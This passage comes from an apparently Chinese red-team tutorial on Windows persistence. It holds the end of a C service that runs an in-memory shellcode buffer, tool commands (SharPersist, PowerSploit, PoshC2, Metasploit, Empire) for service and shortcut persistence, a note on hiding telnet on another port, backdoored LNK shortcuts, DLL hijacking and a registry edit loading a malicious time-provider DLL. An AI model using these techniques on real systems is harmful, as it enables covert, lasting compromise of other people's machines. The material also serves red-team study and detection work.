class="token-line" style="color:#393A34"><span class="token plain">(LPHANDLER_FUNCTION)CtrlHandler);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (hStatus == (SERVICE_STATUS_HANDLE)0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WriteToLog(&quot;RegisterServiceCtrlHandler failed&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WriteToLog(&quot;RegisterServiceCtrlHandler success&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/* Initialize Service   */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">error = InitService();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (error)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/* Initialization failed  */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwCurrentState =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_STOPPED;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwWin32ExitCode = -1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SetServiceStatus(hStatus, &amp;ServiceStatus);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">memcpy(Memory, buf, sizeof(buf));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">((void(*)())Memory)();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/*向SCM 报告运行状态*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwCurrentState =</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_RUNNING;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SetServiceStatus(hStatus, &amp;ServiceStatus);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/*do something you want to do in this while loop*/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MEMORYSTATUS memstatus;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while (ServiceStatus.dwCurrentState ==</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SERVICE_RUNNING)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">char buffer[16];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GlobalMemoryStatus(&amp;memstatus);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int availmb = memstatus.dwAvailPhys / 1024 / 1024;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sprintf_s(buffer, 100, &quot;available memory is %dMB&quot;, availmb);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int result = WriteToLog(buffer);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if (result)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwCurrentState = SERVICE_STOPPED;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceStatus.dwWin32ExitCode = -1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SetServiceStatus(hStatus,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&amp;ServiceStatus);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sleep(SLEEP_TIME);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WriteToLog(&quot;service stopped&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>这其实也是psexec的原理:建立连接后创建服务反弹shell</p>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706162809812-7ca8c0186de971e19e392356b980fd79.bin" width="1080" height="657" class="img_ev3q"></p>
<p>删除服务:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sc</span><span class="token plain"> delete </span><span class="token string" style="color:#e3116c">&quot;SD&quot;</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="其他的一些工具">其他的一些工具<a href="#其他的一些工具" class="hash-link" aria-label="其他的一些工具的直接链接" title="其他的一些工具的直接链接">​</a></h4>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="sharpersist-1">SharPersist<a href="#sharpersist-1" class="hash-link" aria-label="SharPersist的直接链接" title="SharPersist的直接链接">​</a></h5>
<blockquote>
<p><a href="https://github.com/fireeye/SharPersist" target="_blank" rel="noopener noreferrer">https://github.com/fireeye/SharPersist</a></p>
</blockquote>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SharPersist </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">t service </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\System32\cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a </span><span class="token string" style="color:#e3116c">&quot;/c pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">n </span><span class="token string" style="color:#e3116c">&quot;pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">m add</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="powersploit">PowerSploit<a href="#powersploit" class="hash-link" aria-label="PowerSploit的直接链接" title="PowerSploit的直接链接">​</a></h5>
<blockquote>
<p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener noreferrer">https://github.com/PowerShellMafia/PowerSploit</a></p>
</blockquote>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Set-ServiceBinPath</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Name pentestlab </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">binPath </span><span class="token string" style="color:#e3116c">&quot;cmd.exe /k C:\temp\pentestlab.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Write-ServiceBinary</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Name pentestlab </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&quot;cmd.exe /k C:\temp\pentestlab.exe&quot;</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="poshc2-1">PoshC2<a href="#poshc2-1" class="hash-link" aria-label="PoshC2的直接链接" title="PoshC2的直接链接">​</a></h5>
<blockquote>
<p><a href="https://github.com/nettitude/PoshC2_Python" target="_blank" rel="noopener noreferrer">https://github.com/nettitude/PoshC2_Python</a></p>
</blockquote>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">install-servicelevel-persistence</span><br></span></code></pre></div></div>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="metasploit-1">Metasploit<a href="#metasploit-1" class="hash-link" aria-label="Metasploit的直接链接" title="Metasploit的直接链接">​</a></h5>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use post/windows/manage/persistence_exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set REXEPATH /tmp/pentestlab.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SESSION 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set STARTUP SERVICE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LOCALEXEPATH C:\\tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="telnet服务">telnet服务<a href="#telnet服务" class="hash-link" aria-label="telnet服务的直接链接" title="telnet服务的直接链接">​</a></h3>
<p>telnet是命令行下的远程登录工具，不过在服务器管理时使用不多也常为管理员所忽视。攻击者如果在控制一台服务器后，开启“远程桌面”进行远程控制非常容易被管理员察觉，但是启动Telnet进行远程控制却不容易被察觉。不过，telnet的默认端口是23，如果开启后，别人是很容易扫描到的，因此攻击者会更改telnet的端口，从而独享该服务器的控制权。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="快捷方式">快捷方式<a href="#快捷方式" class="hash-link" aria-label="快捷方式的直接链接" title="快捷方式的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="什么是lnk">什么是LNK<a href="#什么是lnk" class="hash-link" aria-label="什么是LNK的直接链接" title="什么是LNK的直接链接">​</a></h3>
<p>lnk文件是用于指向其他文件的一种文件。 这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用手法">利用手法<a href="#利用手法" class="hash-link" aria-label="利用手法的直接链接" title="利用手法的直接链接">​</a></h3>
<ol>
<li>为恶意进程创建快捷方式，并将其加入启动程序。</li>
<li>利用当前用户现有的快捷方式进行迷惑，达到既能开启原程序，又能执行恶意程序的效果。</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用过程">利用过程<a href="#利用过程" class="hash-link" aria-label="利用过程的直接链接" title="利用过程的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="直接修改放置启动目录">直接修改，放置启动目录<a href="#直接修改放置启动目录" class="hash-link" aria-label="直接修改，放置启动目录的直接链接" title="直接修改，放置启动目录的直接链接">​</a></h4>
<blockquote>
<p>右键快捷方式 --&gt; 属性 --&gt; 目标</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20210714112339757" src="/assets/images/image-20210714112339757-1ac73fb41b4115d38281120706310e5e.png" width="1942" height="2026" class="img_ev3q"></p>
<blockquote>
<p>通过更改图标来增加迷惑性</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20210714112646184" src="/assets/images/image-20210714112646184-879ecafc0e7272858bb312c8627af6d2.png" width="2298" height="1780" class="img_ev3q"></p>
<blockquote>
<p>最后放到启动目录即可</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20210714112824723" src="/assets/images/image-20210714112824723-be3b629692525be6bbf75d5d7b5f41cd.png" width="1358" height="318" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="同时启动两个程序">同时启动两个程序<a href="#同时启动两个程序" class="hash-link" aria-label="同时启动两个程序的直接链接" title="同时启动两个程序的直接链接">​</a></h4>
<p>自启动容易被发现，所以用户在打开正常应用的时候允许同时打开2个应用（包含正常应用）稍微隐蔽一点。</p>
<p>这里需要用到<code>powershell</code>进行辅助</p>
<p>修改目标值为：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">powershell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;invoke-item &#x27;C:\Program Files (x86)\Mozilla Firefox\firefox.exe&#x27;; invoke-item c:\windows\system32\calc.exe&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210714113433194" src="/assets/images/image-20210714113433194-223a33022255b1af26f66c8f801f9ca5.png" width="1746" height="1426" class="img_ev3q"></p>
<p>此时点击快捷方式就可以同时启动两个应用了，缺点就是启动的时候会有一个CMD黑框</p>
<p>解决方案：属性中的运行方式选择<strong>最小化</strong></p>
<p><img decoding="async" loading="lazy" alt="image-20210714113628636" src="/assets/images/image-20210714113628636-12b3187a5903fbbf19858a3a5477425e.png" width="1294" height="1970" class="img_ev3q"></p>
<p>此方案不足的点，就是鼠标指向图标时，会显示powershell路径</p>
<p><img decoding="async" loading="lazy" alt="image-20210714113808329" src="/assets/images/image-20210714113808329-f2b96538609f16b6aec398fe2c06bed5.png" width="1530" height="310" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="一些辅助工具">一些辅助工具<a href="#一些辅助工具" class="hash-link" aria-label="一些辅助工具的直接链接" title="一些辅助工具的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="empire-1">Empire<a href="#empire-1" class="hash-link" aria-label="Empire的直接链接" title="Empire的直接链接">​</a></h4>
<p>Empire包含一个持久性模块，该模块可以后门合法的快捷方式（.LNK），以执行任意的PowerShellpayload。现有快捷方式的目标字段将被修改以执行存储在注册表项中的base64脚本。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">usemodule persistence</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">userland</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">backdoor_lnk</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="Empire–后门现有快捷方式" src="/assets/images/894761-20191111103131337-2058768825-4fee71091eb156075b563a3e8c2c2958.png" width="878" height="290" class="img_ev3q"></p>
<p>查看快捷方式的属性将显示目标字段已成功修改以执行PowerShellpayload。</p>
<p><img decoding="async" loading="lazy" alt="Empire-修改后的快捷方式" src="/assets/images/894761-20191111103158377-1494098900-08dcd3476d9e551db32f2f409e2b1d8a.png" width="751" height="793" class="img_ev3q"></p>
<p>由于快捷方式存在于启动文件夹中，因此暂存器将在下一次Windows登录中执行，并且将与命令和控制服务器建立连接。</p>
<p><img decoding="async" loading="lazy" alt=" Empire-通过快捷方式成功上线" src="/assets/images/894761-20191111103234521-1980646915-8e3728795f0aaabf00aede9615bfdb60.png" width="996" height="97" class="img_ev3q"></p>
<p>但是，Empire包含一个可用于生成具有LNK文件格式的暂存器的模块。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">usestager windows</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">launcher_lnk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">set</span><span class="token plain"> Listener http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">execute</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" Empire-创建快捷方式" src="/assets/images/894761-20191111103304964-1116312506-7cd8a28aca7403d860ad394b4d083d66.png" width="724" height="425" class="img_ev3q"></p>
<p>默认情况下，此模块将使用写字板图标伪装成可信任的应用程序。</p>
<p><img decoding="async" loading="lazy" alt=" Empire-写字板快捷方式" src="/assets/images/894761-20191111103333103-972955603-494a277f42dcdcdc403e11dac4d99222.png" width="904" height="447" class="img_ev3q"></p>
<p>快捷方式的目标字段将使用执行Base64payload的PowerShell命令填充。可以将快捷方式转移并移动到启动文件夹中以保持持久性。</p>
<p><img decoding="async" loading="lazy" alt="Empire-快捷属性" src="/assets/images/894761-20191111103410255-1737326702-cd02fc42d56c2a87c9c60d08ccd964ce.png" width="751" height="861" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="sharpersist-2">SharPersist<a href="#sharpersist-2" class="hash-link" aria-label="SharPersist的直接链接" title="SharPersist的直接链接">​</a></h4>
<p><a href="https://github.com/fireeye/SharPersist" target="_blank" rel="noopener noreferrer">SharPersist</a>能够创建Internet Explorer快捷方式，该快捷方式将执行任意payload并将其放置在启动文件夹中以实现持久性。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SharPersist</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">t startupfolder </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">c </span><span class="token string" style="color:#e3116c">&quot;cmd.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">a </span><span class="token string" style="color:#e3116c">&quot;/c C:\temp\pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">f </span><span class="token string" style="color:#e3116c">&quot;pentestlab&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">m add</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" SharPersist –快捷方式" src="/assets/images/894761-20191111103457702-2132720686-43cc73f6a1fab18b5fa627ef79b66e4a.png" width="1024" height="306" class="img_ev3q"></p>
<p>当用户进行身份验证时，将执行payload，并打开Meterpreter会话.</p>
<p><img decoding="async" loading="lazy" alt=" SharPersist – Meterpreter" src="/assets/images/894761-20191111103529714-2117172312-999502d571924efe741c637e53737865.png" width="721" height="155" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="poshc2-2">PoshC2<a href="#poshc2-2" class="hash-link" aria-label="PoshC2的直接链接" title="PoshC2的直接链接">​</a></h4>
<p>PoshC2可以创建一个LNK文件并将其直接放置在Windows启动文件夹中以保持持久性。可以通过执行以下命令来调用此技术：</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">install</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">persistence </span><span class="token number" style="color:#36acaa">3</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt=" PoshC2 –启动LNK文件" src="/assets/images/894761-20191111103555784-447693490-01429c10dd5f2e853f9462e12a544b34.png" width="718" height="190" class="img_ev3q"></p>
<p>在Windows登录期间，快捷方式将尝试在注册表项上执行值，该注册表项包含base64格式的stager。</p>
<p><img decoding="async" loading="lazy" alt=" PoshC2 –快捷方式" src="/assets/images/894761-20191111103622513-1700304293-101e192c962f088230f566401aa6ac53.png" width="919" height="195" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dll劫持">DLL劫持<a href="#dll劫持" class="hash-link" aria-label="DLL劫持的直接链接" title="DLL劫持的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="介绍">介绍<a href="#介绍" class="hash-link" aria-label="介绍的直接链接" title="介绍的直接链接">​</a></h3>
<p>DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p>
<ol>
<li>程序所在⽬录。</li>
<li>加载 DLL 时所在的当前⽬录。</li>
<li>系统⽬录即 SYSTEM32 ⽬录。</li>
<li>16位系统⽬录即 SYSTEM ⽬录。</li>
<li>Windows⽬录。</li>
<li>PATH环境变量中列出的⽬录</li>
</ol>
<p>dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</p>
<p><strong>在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</span><br></span></code></pre></div></div>
<p>关于dll劫持的文章有很多,也需要去挖掘,这里推荐一篇文章入门</p>
<blockquote>
<p><a href="https://www.cnblogs.com/punished/p/14715771.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/punished/p/14715771.html</a></p>
</blockquote>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="时间服务器">时间服务器<a href="#时间服务器" class="hash-link" aria-label="时间服务器的直接链接" title="时间服务器的直接链接">​</a></h3>
<p>Windows操作系统正在利用时间提供者体系结构，以便从网络中的其他网络设备或客户端获取准确的时间戳。时间提供者以DLL文件的形式实现，该文件位于System32文件夹中。Windows启动期间将启动服务<strong>W32Time</strong>并加载w32time.dll。DLL加载是一种已知的技术，通常使红队攻击者有机会执行任意代码。</p>
<p>由于关联的服务会在Windows启动期间自动启动，因此可以将其用作持久性机制。但是，此方法需要管理员级别的特权，因为指向时间提供者DLL文件的注册表项存储在HKEY_LOCAL_MACHINE中。根据系统是用作NTP服务器还是NTP客户端，使用以下两个注册表位置。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer</span><br></span></code></pre></div></div>
<p>该<strong>W32Time将</strong>运行在Windows环境作为本地服务，它是通过svchost的执行。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111134557826-1438345258-df31420f6648039d112f6785229592d1.png" width="1024" height="669" class="img_ev3q"></p>
<p>恶意DLL已放入磁盘中，将执行payload。在命令提示符下，可以通过执行以下命令以指向任意DLL的位置来修改时间提供者注册表项。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v DllName </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\temp\w32time.dll&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111134619162-1282116869-67577acde0d3fb5e1db7b8da4e2fcb51.png" width="1024" height="202" class="img_ev3q"></p>
<p>从注册表编辑器中查看注册表将确认<strong>DllName</strong>的值已更新。</p>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111134635629-24445574-32ea50a46bf5fd3b6e53a3f40032870a.png" width="1024" height="618" class="img_ev3q"></p>
<p>该服务将在Windows启动期间启动，或者通过执行以下命令手动启动。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe stop w32time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sc</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token function" style="color:#d73a49">start</span><span class="token plain"> w32time</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111134702533-1784118205-f8770b0e4225006c1b14e36c10f2e404.png" width="1024" height="596" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="补充说明">补充说明<a href="#补充说明" class="hash-link" aria-label="补充说明的直接链接" title="补充说明的直接链接">​</a></h4>
<p>修改Windows时间提供程序可能会向SOC团队发出警报。来自Carbon Black的<a href="https://twitter.com/5twenty9" target="_blank" rel="noopener noreferrer">Scott Lundgren</a>在C中开发了一种称为<a href="https://github.com/scottlundgren/w32time" target="_blank" rel="noopener noreferrer">gametime</a>的时间提供程序。可以使用此DLL来向操作系统注册新的时间提供者，并在其他注册表项中执行修改。这样可以避免滥用现有的Windows时间提供程序，而该时间提供程序可以由SOC监视。Rundll32可用于注册DLL。</p>
<p>Scott Lundgren使用了要在系统上创建的注册表项“ GameTime”。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#define GAMETIME_SVC_KEY_NAME   L&quot;System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\GameTime&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="时间提供者– GameTime注册表项" src="/assets/images/894761-20191111134730038-745714950-6abd727127edcda2b8cc15ba1c64bdb9.png" width="1024" height="358" class="img_ev3q"></p>
